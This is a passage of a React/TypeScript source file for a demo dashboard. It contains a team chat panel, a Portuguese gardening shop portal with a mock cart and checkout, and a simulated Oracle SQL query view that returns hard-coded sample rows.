              className="w-full h-9 rounded-lg bg-slate-100 border-none pl-10 text-sm focus:ring-2 focus:ring-green-500" 
              placeholder="Search members..." 
            />
          </div>
        </div>
        <ScrollArea className="flex-1 min-h-0">
          <div className="p-2 space-y-1">
            {members.map((member) => (
              <button
                key={member.id}
                onClick={() => setSelectedMember(member.id)}
                className={cn(
                  "w-full flex items-center gap-3 p-3 rounded-xl transition-all",
                  selectedMember === member.id ? "bg-green-50" : "hover:bg-slate-50"
                )}
              >
                <div className="relative">
                  <Avatar className="w-10 h-10 border-2 border-white shadow-sm">
                    <AvatarImage src={member.avatar} />
                    <AvatarFallback>{member.name[0]}</AvatarFallback>
                  </Avatar>
                  <div className={cn(
                    "absolute bottom-0 right-0 w-3 h-3 rounded-full border-2 border-white",
                    member.status === 'online' ? "bg-green-500" : 
                    member.status === 'away' ? "bg-yellow-500" : "bg-slate-300"
                  )} />
                </div>
                <div className="text-left overflow-hidden">
                  <p className={cn("text-sm font-bold truncate", selectedMember === member.id ? "text-green-700" : "text-slate-900")}>
                    {member.name}
                  </p>
                  <p className="text-xs text-slate-500 truncate">{member.role}</p>
                </div>
              </button>
            ))}
          </div>
        </ScrollArea>
      </div>

      {/* Chat Area */}
      <div className="flex-1 flex flex-col bg-slate-50/30 h-full min-h-0">
        {/* Chat Header */}
        <div className="p-4 border-b border-slate-100 bg-white flex items-center justify-between shrink-0">
          <div className="flex items-center gap-3">
            <Avatar className="w-10 h-10">
              <AvatarImage src={members.find(m => m.id === selectedMember)?.avatar} />
              <AvatarFallback>{selectedMember[0]}</AvatarFallback>
            </Avatar>
            <div>
              <h3 className="font-bold text-slate-900">{members.find(m => m.id === selectedMember)?.name}</h3>
              <p className="text-xs text-green-600 font-medium">Active now</p>
            </div>
          </div>
          <div className="flex items-center gap-2">
            <Button variant="ghost" size="icon" className="text-slate-400 hover:text-green-600">
              <Phone className="w-5 h-5" />
            </Button>
            <Button variant="ghost" size="icon" className="text-slate-400 hover:text-green-600">
              <Video className="w-5 h-5" />
            </Button>
            <Button variant="ghost" size="icon" className="text-slate-400 hover:text-green-600">
              <Info className="w-5 h-5" />
            </Button>
            <Button variant="ghost" size="icon" className="text-slate-400 hover:text-green-600">
              <MoreVertical className="w-5 h-5" />
            </Button>
          </div>
        </div>

        {/* Messages */}
        <ScrollArea className="flex-1 p-6 min-h-0">
          <div className="space-y-6">
            <div className="flex justify-center">
              <span className="px-3 py-1 bg-slate-200/50 rounded-full text-[10px] font-bold text-slate-500 uppercase tracking-wider">
                Today
              </span>
            </div>
            
            {chatHistory.map((msg) => (
              <div key={msg.id} className={cn("flex gap-4", msg.sender === 'You' ? "flex-row-reverse" : "flex-row")}>
                <Avatar className="w-8 h-8 shrink-0">
                  <AvatarImage src={members.find(m => m.id === msg.sender)?.avatar || 'https://github.com/shadcn.png'} />
                  <AvatarFallback>{msg.sender[0]}</AvatarFallback>
                </Avatar>
                <div className={cn("space-y-1", msg.sender === 'You' ? "items-end" : "items-start")}>
                  <div className={cn("flex items-baseline gap-2", msg.sender === 'You' ? "flex-row-reverse" : "flex-row")}>
                    <span className="text-sm font-bold text-slate-900">{msg.sender}</span>
                    <span className="text-[10px] text-slate-400 font-medium">{msg.time}</span>
                  </div>
                  <div className={cn(
                    "p-3 rounded-2xl border shadow-sm max-w-md",
                    msg.sender === 'You' 
                      ? "bg-green-600 text-white border-green-700 rounded-tr-none" 
                      : "bg-white text-slate-700 border-slate-100 rounded-tl-none"
                  )}>
                    <p className="text-sm leading-relaxed">{msg.text}</p>
                  </div>
                </div>
              </div>
            ))}
          </div>
        </ScrollArea>

        {/* Input Area */}
        <div className="p-4 bg-white border-t border-slate-100">
          <div className="flex items-center gap-3 bg-slate-100 rounded-2xl px-4 py-2">
            <input 
              value={message}
              onChange={(e) => setMessage(e.target.value)}
              onKeyDown={(e) => e.key === 'Enter' && handleSendMessage()}
              className="flex-1 bg-transparent border-none focus:ring-0 text-sm py-2" 
              placeholder={`Message ${members.find(m => m.id === selectedMember)?.name}...`} 
            />
            <div className="flex items-center gap-2">
              <Button size="icon" variant="ghost" className="text-slate-400 hover:text-green-600 h-8 w-8">
                <Wrench className="w-4 h-4" />
              </Button>
              <Button 
                onClick={handleSendMessage}
                size="icon" 
                className="bg-green-600 hover:bg-green-700 h-8 w-8 rounded-xl"
              >
                <Send className="w-4 h-4 text-white" />
              </Button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

const PortalView = () => {
  const [selectedCategory, setSelectedCategory] = useState<string | null>(null);
  const [viewMode, setViewMode] = useState<'desktop' | 'mobile'>('desktop');
  const [cart, setCart] = useState<{ product: any, quantity: number }[]>([]);
  const [isCheckoutOpen, setIsCheckoutOpen] = useState(false);
  const [checkoutStep, setCheckoutStep] = useState<'cart' | 'details' | 'payment' | 'success'>('cart');
  const [formData, setFormData] = useState({
    name: '',
    email: '',
    address: '',
    city: '',
    zip: '',
    paymentMethod: 'credit_card'
  });

  const categories = [
    { id: 'plantas', name: 'Plantas de Interior', icon: Leaf, count: portalProducts.filter(p => p.category === 'plantas').length },
    { id: 'arvores', name: 'Árvores Ornamentais', icon: TreePine, count: portalProducts.filter(p => p.category === 'arvores').length },
    { id: 'jardinagem', name: 'Jardinagem Industrial', icon: Truck, count: portalProducts.filter(p => p.category === 'jardinagem').length },
    { id: 'sementes', name: 'Sementes e Mudas', icon: Sprout, count: portalProducts.filter(p => p.category === 'sementes').length },
  ];

  const filteredProducts = selectedCategory 
    ? portalProducts.filter(p => p.category === selectedCategory)
    : portalProducts;

  const addToCart = (product: any) => {
    setCart(prev => {
      const existing = prev.find(item => item.product.id === product.id);
      if (existing) {
        return prev.map(item => item.product.id === product.id ? { ...item, quantity: item.quantity + 1 } : item);
      }
      return [...prev, { product, quantity: 1 }];
    });
  };

  const removeFromCart = (productId: number) => {
    setCart(prev => prev.filter(item => item.product.id !== productId));
  };

  const cartTotal = cart.reduce((acc, item) => acc + (item.product.price * item.quantity), 0);

  const PortalContent = ({ isMobile = false }: { isMobile?: boolean }) => (
    <div className={cn("space-y-8", isMobile && "space-y-4 p-4")}>
      <div className={cn("flex items-center justify-between", isMobile && "flex-col gap-4 items-start")}>
        <div>
          <h1 className={cn("font-black text-slate-900 tracking-tight", isMobile ? "text-xl" : "text-3xl")}>Portal de Jardinagem</h1>
          <p className={cn("text-slate-500 font-medium", isMobile ? "text-[10px]" : "text-sm")}>Sua loja premium de plantas e equipamentos industriais.</p>
        </div>
        <div className={cn("flex gap-4", isMobile && "w-full")}>
          <Button variant="outline" className={cn("rounded-xl", isMobile && "flex-1 text-xs h-8")} onClick={() => setSelectedCategory(null)}>
            <RefreshCw className="w-3 h-3 mr-2" /> {isMobile ? "Todos" : "Ver Todos"}
          </Button>
          <Button 
            onClick={() => {
              setCheckoutStep('cart');
              setIsCheckoutOpen(true);
            }}
            className={cn("bg-green-600 hover:bg-green-700 rounded-xl", isMobile && "flex-1 text-xs h-8")}
          >
            <ShoppingBag className="w-3 h-3 mr-2" /> {isMobile ? `Cart (${cart.length})` : `Carrinho (${cart.length})`}
          </Button>
        </div>
      </div>

      {/* Hero Section */}
      {!selectedCategory && (
        <motion.div 
          initial={{ opacity: 0, scale: 0.95 }}
          animate={{ opacity: 1, scale: 1 }}
          className={cn("relative rounded-3xl overflow-hidden group", isMobile ? "h-40" : "h-64")}
        >
          <img 
            src="https://picsum.photos/seed/garden-hero/1200/400" 
            alt="Garden Hero" 
            className="w-full h-full object-cover transition-transform duration-700 group-hover:scale-105"
            referrerPolicy="no-referrer"
          />
          <div className={cn("absolute inset-0 bg-gradient-to-r from-black/60 to-transparent flex flex-col justify-center", isMobile ? "p-6" : "p-12")}>
            <Badge className={cn("w-fit mb-2 bg-green-500", isMobile ? "text-[8px] px-1 h-4" : "mb-4")}>Nova Coleção</Badge>
            <h2 className={cn("font-bold text-white mb-1", isMobile ? "text-xl" : "text-4xl")}>Verão Tropical 2024</h2>
            <p className={cn("text-white/80", isMobile ? "text-[10px] line-clamp-2" : "text-sm max-w-md")}>Transforme seu espaço com as melhores espécies de palmeiras e plantas ornamentais do mercado.</p>
          </div>
        </motion.div>
      )}

      {/* Categories */}
      <div className={cn("grid gap-6", isMobile ? "grid-cols-2 gap-3" : "grid-cols-4")}>
        {categories.map((cat) => (
          <Card 
            key={cat.id} 
            onClick={() => setSelectedCategory(selectedCategory === cat.id ? null : cat.id)}
            className={cn(
              "transition-all cursor-pointer group border-2",
              selectedCategory === cat.id ? "border-green-600 bg-green-50/50 shadow-md" : "hover:border-green-500 border-transparent",
              isMobile && "p-0"
            )}
          >
            <CardContent className={cn("flex items-center gap-4", isMobile ? "p-3 gap-2" : "p-6")}>
              <div className={cn(
                "rounded-2xl transition-colors",
                selectedCategory === cat.id ? "bg-green-600 text-white" : "bg-green-50 text-green-600 group-hover:bg-green-100",
                isMobile ? "p-2" : "p-3"
              )}>
                <cat.icon className={isMobile ? "w-4 h-4" : "w-6 h-6"} />
              </div>
              <div>
                <h3 className={cn("font-bold text-slate-900", isMobile ? "text-[10px]" : "text-sm")}>{cat.name}</h3>
                <p className={cn("text-slate-500", isMobile ? "text-[8px]" : "text-xs")}>{cat.count} itens</p>
              </div>
            </CardContent>
          </Card>
        ))}
      </div>

      {/* Featured Products */}
      <div className="space-y-6">
        <div className="flex items-center justify-between">
          <h2 className={cn("font-bold text-slate-900", isMobile ? "text-sm" : "text-xl")}>
            {selectedCategory 
              ? categories.find(c => c.id === selectedCategory)?.name 
              : "Produtos em Destaque"}
          </h2>
          {selectedCategory && (
            <Button variant="link" onClick={() => setSelectedCategory(null)} className={cn("text-green-600 font-bold", isMobile && "text-[10px] h-6")}>
              Limpar Filtro
            </Button>
          )}
        </div>
        
        <div className={cn("grid gap-8", isMobile ? "grid-cols-1 gap-4" : "grid-cols-3")}>
          <AnimatePresence mode="popLayout">
            {filteredProducts.map((product) => (
              <motion.div
                key={product.id}
                layout
                initial={{ opacity: 0, scale: 0.9 }}
                animate={{ opacity: 1, scale: 1 }}
                exit={{ opacity: 0, scale: 0.9 }}
                transition={{ duration: 0.2 }}
              >
                <Card className="overflow-hidden rounded-2xl border-slate-100 hover:shadow-xl transition-all group h-full flex flex-col">
                  <div className={cn("overflow-hidden relative", isMobile ? "h-32" : "h-48")}>
                    <img 
                      src={`https://picsum.photos/seed/${product.id + 100}/400/300`} 
                      alt={product.name} 
                      className="w-full h-full object-cover transition-transform duration-500 group-hover:scale-110"
                      referrerPolicy="no-referrer"
                    />
                  </div>
                  <CardContent className={cn("flex-1 flex flex-col", isMobile ? "p-3" : "p-6")}>
                    <div className="flex justify-between items-start mb-2">
                      <span className="text-[10px] font-bold uppercase tracking-wider text-green-600">{product.category}</span>
                      <span className={cn("font-bold text-slate-900", isMobile && "text-xs")}>{product.price.toFixed(2)} €</span>
                    </div>
                    <h3 className={cn("font-bold text-slate-900 mb-2", isMobile ? "text-xs" : "text-sm")}>{product.name}</h3>
                    <p className={cn("text-slate-500 mb-4 flex-1 line-clamp-2", isMobile ? "text-[10px]" : "text-xs")}>{product.description}</p>
                    <Button 
                      onClick={() => addToCart(product)}
                      className={cn("w-full bg-slate-900 hover:bg-green-600 text-white rounded-xl transition-colors", isMobile && "h-8 text-[10px]")}
                    >
                      Adicionar ao Carrinho
                    </Button>
                  </CardContent>
                </Card>
              </motion.div>
            ))}
          </AnimatePresence>
        </div>
      </div>

      {/* Partners Section */}
      <div className={cn("space-y-6 pt-8 border-t border-slate-100", isMobile && "pt-4 space-y-3")}>
        <h2 className={cn("font-bold text-slate-900", isMobile ? "text-sm" : "text-xl")}>Nossos Parceiros Premium</h2>
        <div className={cn("flex flex-wrap gap-4", isMobile && "gap-2")}>
          {portalCompanies.map((company) => (
            <div key={company.nome} className={cn("bg-white border-2 border-slate-100 rounded-2xl flex items-center gap-3 hover:border-green-500 transition-all cursor-pointer group", isMobile ? "px-3 py-2 gap-2" : "px-6 py-3")}>
              <div className={cn("rounded-full bg-slate-50 flex items-center justify-center group-hover:bg-green-50 transition-colors", isMobile ? "w-6 h-6" : "w-8 h-8")}>
                <ShoppingBag className={isMobile ? "w-3 h-3" : "w-4 h-4 text-slate-400 group-hover:text-green-600"} />
              </div>
              <span className={cn("font-bold text-slate-700 group-hover:text-slate-900", isMobile ? "text-[10px]" : "text-sm")}>{company.nome}</span>
            </div>
          ))}
        </div>
      </div>
    </div>
  );

  return (
    <div className="flex flex-col h-full space-y-6">
      <div className="flex items-center justify-between bg-white p-4 rounded-2xl border-2 border-slate-100 shadow-sm">
        <div className="flex items-center gap-4">
          <div className="p-2 bg-green-100 rounded-xl">
            <Smartphone className="w-5 h-5 text-green-600" />
          </div>
          <div>
            <h3 className="font-bold text-slate-900">Visualização do Portal</h3>
            <p className="text-xs text-slate-500">Alterne entre as versões Desktop e Mobile.</p>
          </div>
        </div>
        <div className="flex bg-slate-100 p-1 rounded-xl">
          <button
            onClick={() => setViewMode('desktop')}
            className={cn(
              "flex items-center gap-2 px-4 py-2 rounded-lg text-sm font-bold transition-all",
              viewMode === 'desktop' ? "bg-white text-slate-900 shadow-sm" : "text-slate-500 hover:text-slate-700"
            )}
          >
            <Monitor className="w-4 h-4" /> Desktop
          </button>
          <button
            onClick={() => setViewMode('mobile')}
            className={cn(
              "flex items-center gap-2 px-4 py-2 rounded-lg text-sm font-bold transition-all",
              viewMode === 'mobile' ? "bg-white text-slate-900 shadow-sm" : "text-slate-500 hover:text-slate-700"
            )}
          >
            <Smartphone className="w-4 h-4" /> Mobile
          </button>
        </div>
      </div>

      <div className="flex-1 min-h-0">
        {viewMode === 'desktop' ? (
          <PortalContent />
        ) : (
          <div className="flex justify-center h-full py-4">
            {/* Simulated Phone Frame */}
            <div className="relative w-[375px] h-[700px] bg-slate-900 rounded-[3rem] border-[8px] border-slate-800 shadow-2xl overflow-hidden flex flex-col">
              {/* Notch */}
              <div className="absolute top-0 left-1/2 -translate-x-1/2 w-32 h-6 bg-slate-800 rounded-b-2xl z-20" />
              
              {/* Screen Content */}
              <div className="flex-1 bg-white overflow-y-auto custom-scrollbar">
                <PortalContent isMobile />
              </div>

              {/* Home Bar */}
              <div className="h-6 bg-white flex justify-center items-center">
                <div className="w-24 h-1 bg-slate-200 rounded-full" />
              </div>
            </div>
          </div>
        )}
      </div>

      {/* Checkout Modal */}
      <AnimatePresence>
        {isCheckoutOpen && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm">
            <motion.div
              initial={{ opacity: 0, scale: 0.9, y: 20 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 0.9, y: 20 }}
              className="bg-white w-full max-w-2xl rounded-3xl shadow-2xl overflow-hidden flex flex-col max-h-[90vh]"
            >
              <div className="p-6 border-b border-slate-100 flex items-center justify-between bg-slate-50">
                <div className="flex items-center gap-3">
                  <div className="p-2 bg-green-600 rounded-xl">
                    <ShoppingCart className="w-5 h-5 text-white" />
                  </div>
                  <h2 className="text-xl font-black text-slate-900">Finalizar Compra</h2>
                </div>
                <Button variant="ghost" size="icon" onClick={() => setIsCheckoutOpen(false)}>
                  <XCircle className="w-6 h-6 text-slate-400" />
                </Button>
              </div>

              <div className="flex-1 overflow-y-auto p-8">
                {/* Steps Indicator */}
                <div className="flex items-center justify-between mb-12 px-12 relative">
                  <div className="absolute top-1/2 left-12 right-12 h-0.5 bg-slate-100 -translate-y-1/2 z-0" />
                  {[
                    { id: 'cart', label: 'Carrinho' },
                    { id: 'details', label: 'Dados' },
                    { id: 'payment', label: 'Pagamento' },
                    { id: 'success', label: 'Sucesso' }
                  ].map((step, i) => (
                    <div key={step.id} className="relative z-10 flex flex-col items-center gap-2">
                      <div className={cn(
                        "w-8 h-8 rounded-full flex items-center justify-center font-bold text-xs transition-all",
                        checkoutStep === step.id ? "bg-green-600 text-white scale-110 shadow-lg" : 
                        (i < ['cart', 'details', 'payment', 'success'].indexOf(checkoutStep) ? "bg-green-100 text-green-600" : "bg-white border-2 border-slate-100 text-slate-400")
                      )}>
                        {i < ['cart', 'details', 'payment', 'success'].indexOf(checkoutStep) ? <CheckCircle2 className="w-4 h-4" /> : i + 1}
                      </div>
                      <span className={cn("text-[10px] font-bold uppercase tracking-wider", checkoutStep === step.id ? "text-green-600" : "text-slate-400")}>
                        {step.label}
                      </span>
                    </div>
                  ))}
                </div>

                {checkoutStep === 'cart' && (
                  <div className="space-y-6">
                    {cart.length === 0 ? (
                      <div className="text-center py-12 space-y-4">
                        <div className="w-20 h-20 bg-slate-50 rounded-full flex items-center justify-center mx-auto">
                          <ShoppingBag className="w-10 h-10 text-slate-300" />
                        </div>
                        <p className="text-slate-500 font-medium">Seu carrinho está vazio.</p>
                        <Button onClick={() => setIsCheckoutOpen(false)} variant="outline" className="rounded-xl">Voltar às compras</Button>
                      </div>
                    ) : (
                      <>
                        <div className="space-y-4">
                          {cart.map((item) => (
                            <div key={item.product.id} className="flex items-center gap-4 p-4 bg-slate-50 rounded-2xl border border-slate-100">
                              <img src={`https://picsum.photos/seed/${item.product.id + 100}/100/100`} className="w-16 h-16 rounded-xl object-cover" referrerPolicy="no-referrer" />
                              <div className="flex-1">
                                <h4 className="font-bold text-slate-900">{item.product.name}</h4>
                                <p className="text-xs text-slate-500">Quantidade: {item.quantity}</p>
                              </div>
                              <div className="text-right">
                                <p className="font-bold text-slate-900">{(item.product.price * item.quantity).toFixed(2)} €</p>
                                <button onClick={() => removeFromCart(item.product.id)} className="text-[10px] text-red-500 font-bold hover:underline">Remover</button>
                              </div>
                            </div>
                          ))}
                        </div>
                        <div className="p-6 bg-green-50 rounded-2xl border border-green-100 flex justify-between items-center">
                          <span className="font-bold text-green-900">Total do Pedido</span>
                          <span className="text-2xl font-black text-green-600">{cartTotal.toFixed(2)} €</span>
                        </div>
                        <Button onClick={() => setCheckoutStep('details')} className="w-full bg-slate-900 hover:bg-green-600 text-white h-12 rounded-xl font-bold">
                          Continuar para Dados de Entrega
                        </Button>
                      </>
                    )}
                  </div>
                )}

                {checkoutStep === 'details' && (
                  <div className="space-y-6">
                    <div className="grid grid-cols-2 gap-4">
                      <div className="space-y-2">
                        <label className="text-xs font-bold text-slate-500 uppercase">Nome Completo</label>
                        <input 
                          type="text" 
                          value={formData.name}
                          onChange={(e) => setFormData({...formData, name: e.target.value})}
                          className="w-full p-3 bg-slate-50 border border-slate-100 rounded-xl outline-none focus:border-green-500 transition-colors"
                          placeholder="Ex: João Silva"
                        />
                      </div>
                      <div className="space-y-2">
                        <label className="text-xs font-bold text-slate-500 uppercase">E-mail</label>
                        <input 
                          type="email" 
                          value={formData.email}
                          onChange={(e) => setFormData({...formData, email: e.target.value})}
                          className="w-full p-3 bg-slate-50 border border-slate-100 rounded-xl outline-none focus:border-green-500 transition-colors"
                          placeholder="joao@exemplo.com"
                        />
                      </div>
                    </div>
                    <div className="space-y-2">
                      <label className="text-xs font-bold text-slate-500 uppercase">Endereço</label>
                      <input 
                        type="text" 
                        value={formData.address}
                        onChange={(e) => setFormData({...formData, address: e.target.value})}
                        className="w-full p-3 bg-slate-50 border border-slate-100 rounded-xl outline-none focus:border-green-500 transition-colors"
                        placeholder="Rua, Número, Complemento"
                      />
                    </div>
                    <div className="grid grid-cols-2 gap-4">
                      <div className="space-y-2">
                        <label className="text-xs font-bold text-slate-500 uppercase">Concelho / Distrito</label>
                        <input 
                          type="text" 
                          value={formData.city}
                          onChange={(e) => setFormData({...formData, city: e.target.value})}
                          className="w-full p-3 bg-slate-50 border border-slate-100 rounded-xl outline-none focus:border-green-500 transition-colors"
                          placeholder="Ex: Lisboa"
                        />
                      </div>
                      <div className="space-y-2">
                        <label className="text-xs font-bold text-slate-500 uppercase">Código Postal</label>
                        <input 
                          type="text" 
                          value={formData.zip}
                          onChange={(e) => setFormData({...formData, zip: e.target.value})}
                          className="w-full p-3 bg-slate-50 border border-slate-100 rounded-xl outline-none focus:border-green-500 transition-colors"
                          placeholder="1000-001"
                        />
                      </div>
                    </div>
                    <div className="flex gap-4 pt-4">
                      <Button onClick={() => setCheckoutStep('cart')} variant="outline" className="flex-1 rounded-xl h-12">Voltar</Button>
                      <Button 
                        disabled={!formData.name || !formData.email || !formData.address}
                        onClick={() => setCheckoutStep('payment')} 
                        className="flex-1 bg-slate-900 hover:bg-green-600 text-white h-12 rounded-xl font-bold"
                      >
                        Ir para Pagamento
                      </Button>
                    </div>
                  </div>
                )}

                {checkoutStep === 'payment' && (
                  <div className="space-y-6">
                    <div className="space-y-4">
                      {[
                        { id: 'credit_card', label: 'Cartão de Crédito', icon: CreditCard },
                        { id: 'mbway', label: 'MB Way (Aprovação Instantânea)', icon: Zap },
                        { id: 'multibanco', label: 'Referência Multibanco', icon: FileText }
                      ].map((method) => (
                        <button
                          key={method.id}
                          onClick={() => setFormData({...formData, paymentMethod: method.id})}
                          className={cn(
                            "w-full flex items-center justify-between p-4 rounded-2xl border-2 transition-all",
                            formData.paymentMethod === method.id ? "border-green-600 bg-green-50 shadow-md" : "border-slate-100 hover:border-slate-200"
                          )}
                        >
                          <div className="flex items-center gap-4">
                            <div className={cn(
                              "p-2 rounded-xl",
                              formData.paymentMethod === method.id ? "bg-green-600 text-white" : "bg-slate-100 text-slate-400"
                            )}>
                              <method.icon className="w-5 h-5" />
                            </div>
                            <span className="font-bold text-slate-900">{method.label}</span>
                          </div>
                          <div className={cn(
                            "w-5 h-5 rounded-full border-2 flex items-center justify-center",
                            formData.paymentMethod === method.id ? "border-green-600 bg-green-600" : "border-slate-200"
                          )}>
                            {formData.paymentMethod === method.id && <div className="w-2 h-2 bg-white rounded-full" />}
                          </div>
                        </button>
                      ))}
                    </div>

                    {formData.paymentMethod === 'credit_card' && (
                      <div className="p-6 bg-slate-50 rounded-2xl border border-slate-100 space-y-4">
                        <div className="space-y-2">
                          <label className="text-[10px] font-bold text-slate-500 uppercase">Número do Cartão</label>
                          <input type="text" className="w-full p-3 bg-white border border-slate-200 rounded-xl outline-none" placeholder="0000 0000 0000 0000" />
                        </div>
                        <div className="grid grid-cols-2 gap-4">
                          <div className="space-y-2">
                            <label className="text-[10px] font-bold text-slate-500 uppercase">Validade</label>
                            <input type="text" className="w-full p-3 bg-white border border-slate-200 rounded-xl outline-none" placeholder="MM/AA" />
                          </div>
                          <div className="space-y-2">
                            <label className="text-[10px] font-bold text-slate-500 uppercase">CVV</label>
                            <input type="text" className="w-full p-3 bg-white border border-slate-200 rounded-xl outline-none" placeholder="123" />
                          </div>
                        </div>
                      </div>
                    )}

                    <div className="flex gap-4 pt-4">
                      <Button onClick={() => setCheckoutStep('details')} variant="outline" className="flex-1 rounded-xl h-12">Voltar</Button>
                      <Button 
                        onClick={() => {
                          setTimeout(() => setCheckoutStep('success'), 1500);
                        }} 
                        className="flex-1 bg-green-600 hover:bg-green-700 text-white h-12 rounded-xl font-bold flex items-center justify-center gap-2"
                      >
                        Finalizar Pedido - {cartTotal.toFixed(2)} €
                      </Button>
                    </div>
                  </div>
                )}

                {checkoutStep === 'success' && (
                  <div className="text-center py-12 space-y-6">
                    <motion.div
                      initial={{ scale: 0 }}
                      animate={{ scale: 1 }}
                      className="w-24 h-24 bg-green-100 rounded-full flex items-center justify-center mx-auto"
                    >
                      <CheckCircle2 className="w-12 h-12 text-green-600" />
                    </motion.div>
                    <div className="space-y-2">
                      <h3 className="text-2xl font-black text-slate-900">Pedido Realizado!</h3>
                      <p className="text-slate-500">Obrigado pela sua compra, {formData.name.split(' ')[0]}.</p>
                      <p className="text-xs text-slate-400">Um e-mail de confirmação foi enviado para {formData.email}.</p>
                    </div>
                    <div className="p-6 bg-slate-50 rounded-2xl border border-slate-100 max-w-sm mx-auto text-left space-y-3">
                      <div className="flex justify-between text-xs">
                        <span className="text-slate-500">Número do Pedido:</span>
                        <span className="font-bold text-slate-900">#ORD-{Math.floor(Math.random() * 100000)}</span>
                      </div>
                      <div className="flex justify-between text-xs">
                        <span className="text-slate-500">Método:</span>
                        <span className="font-bold text-slate-900 capitalize">{formData.paymentMethod.replace('_', ' ')}</span>
                      </div>
                      <div className="flex justify-between text-sm pt-2 border-t border-slate-200">
                        <span className="font-bold text-slate-900">Total Pago:</span>
                        <span className="font-bold text-green-600">{cartTotal.toFixed(2)} €</span>
                      </div>
                    </div>
                    <Button 
                      onClick={() => {
                        setCart([]);
                        setIsCheckoutOpen(false);
                      }} 
                      className="bg-slate-900 hover:bg-green-600 text-white h-12 px-8 rounded-xl font-bold"
                    >
                      Voltar ao Início
                    </Button>
                  </div>
                )}
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
};

const OracleView = () => {
  const [query, setQuery] = useState('SELECT * FROM plantas;');
  const [results, setResults] = useState<any[]>([]);
  const [error, setError] = useState<string | null>(null);

  const executeQuery = () => {
    setError(null);
    const q = query.trim().toLowerCase();
    
    if (!q.startsWith('select')) {
      setError('Error: Only SELECT queries are allowed in this simulation.');
      return;
    }

    const match = q.match(/from\s+(\w+)/);
    if (!match) {
      setError('Error: Invalid SQL syntax. Missing FROM clause.');
      return;
    }

    const tableName = match[1];
    const validTables = [
      'plantas', 'arvores', 'jardinagem', 'sementes', 
      'clientes', 'empresas', 
      'mv_vendas_por_categoria', 'mv_top_clientes',
      'cloudenginners', 'devops', 'applicationsupporteng'
    ];

    if (!validTables.includes(tableName)) {
      setError(`Error: Table or View "${tableName}" not found.`);
      return;
    }

    let filtered: any[] = [];
    if (['plantas', 'arvores', 'jardinagem', 'sementes'].includes(tableName)) {
      filtered = portalProducts.filter(p => p.category === tableName);
    } else if (tableName === 'clientes') {
      filtered = portalClients;
    } else if (tableName === 'empresas') {
      filtered = portalCompanies;
    } else if (tableName === 'cloudenginners') {
      filtered = [
        { id: 1, nome: 'Cristiano Ronaldo', posicao: 'Avançado', nacionalidade: 'Portugal', especialidade: 'AWS/Azure' },
        { id: 2, nome: 'Lionel Messi', posicao: 'Avançado', nacionalidade: 'Argentina', especialidade: 'Google Cloud' },
        { id: 3, nome: 'Neymar Jr', posicao: 'Avançado', nacionalidade: 'Brasil', especialidade: 'Multi-Cloud' },
        { id: 4, nome: 'Kylian Mbappé', posicao: 'Avançado', nacionalidade: 'França', especialidade: 'Serverless' },
        { id: 5, nome: 'Erling Haaland', posicao: 'Avançado', nacionalidade: 'Noruega', especialidade: 'Kubernetes' },
      ];
    } else if (tableName === 'devops') {
      filtered = [
        { id: 1, nome: 'Kevin De Bruyne', posicao: 'Médio', nacionalidade: 'Bélgica', especialidade: 'CI/CD Pipelines' },
        { id: 2, nome: 'Luka Modrić', posicao: 'Médio', nacionalidade: 'Croácia', especialidade: 'Terraform/IaC' },
        { id: 3, nome: 'Toni Kroos', posicao: 'Médio', nacionalidade: 'Alemanha', especialidade: 'Automation' },
        { id: 4, nome: 'Bruno Fernandes', posicao: 'Médio', nacionalidade: 'Portugal', especialidade: 'Monitoring' },
        { id: 5, nome: 'Joshua Kimmich', posicao: 'Médio', nacionalidade: 'Alemanha', especialidade: 'Docker/Security' },
      ];
    } else if (tableName === 'applicationsupporteng') {
      filtered = [
        { id: 1, nome: 'Virgil van Dijk', posicao: 'Defesa', nacionalidade: 'Países Baixos', especialidade: 'L3 Support' },
        { id: 2, nome: 'Sergio Ramos', posicao: 'Defesa', nacionalidade: 'Espanha', especialidade: 'Incident Management' },
        { id: 3, nome: 'Marquinhos', posicao: 'Defesa', nacionalidade: 'Brasil', especialidade: 'Performance Tuning' },
        { id: 4, nome: 'Alphonso Davies', posicao: 'Defesa', nacionalidade: 'Canadá', especialidade: 'User Experience' },
        { id: 5, nome: 'Achraf Hakimi', posicao: 'Defesa', nacionalidade: 'Marrocos', especialidade: 'API Integration' },
      ];
    } else if (tableName === 'mv_vendas_por_categoria') {
      filtered = [
        { categoria: 'PLANTAS', total_vendas: 12500.45, qtd_itens: 450 },
        { categoria: 'ARVORES', total_vendas: 8900.00, qtd_itens: 120 },
        { categoria: 'JARDINAGEM', total_vendas: 15600.20, qtd_itens: 890 },
        { categoria: 'SEMENTES', total_vendas: 4200.15, qtd_itens: 2300 },
      ];
    } else if (tableName === 'mv_top_clientes') {
      filtered = portalClients.slice(0, 3).map(c => ({ nome: c.nome, total_gasto: Math.random() * 5000 }));
    }
    setResults(filtered);
  };

  return (
    <div className="h-full flex flex-col gap-6">
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-4">
          <div className="w-12 h-12 rounded-2xl bg-red-600 flex items-center justify-center shadow-lg shadow-red-200">
            <Database className="w-6 h-6 text-white" />
          </div>
          <div>
            <h1 className="text-2xl font-bold text-slate-900">Oracle SQL Developer</h1>
            <p className="text-sm text-slate-500">Connected to: <span className="font-mono font-bold text-red-600">PRODUTOS</span></p>
          </div>
        </div>
        <div className="flex gap-2">
          <Button variant="outline" className="gap-2 border-slate-200">
            <Save className="w-4 h-4" /> Save Script
          </Button>
          <Button onClick={executeQuery} className="gap-2 bg-red-600 hover:bg-red-700 text-white shadow-md shadow-red-100">
            <Play className="w-4 h-4" /> Run Query
          </Button>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-4 gap-6 flex-1 min-h-0">
        {/* Connections & Explorer */}
        <Card className="lg:col-span-1 border-slate-100 shadow-sm overflow-hidden flex flex-col">
          <div className="p-4 bg-slate-50 border-b border-slate-100 flex items-center justify-between">
            <span className="text-xs font-bold text-slate-500 uppercase tracking-wider">Connections</span>
            <Plus className="w-4 h-4 text-slate-400 cursor-pointer hover:text-red-600" />
          </div>
          <ScrollArea className="flex-1">
            <div className="p-4 space-y-6">
              {/* PRODUTOS Schema */}
              <div className="space-y-2">
                <div className="flex items-center gap-2 text-sm font-bold text-slate-700">
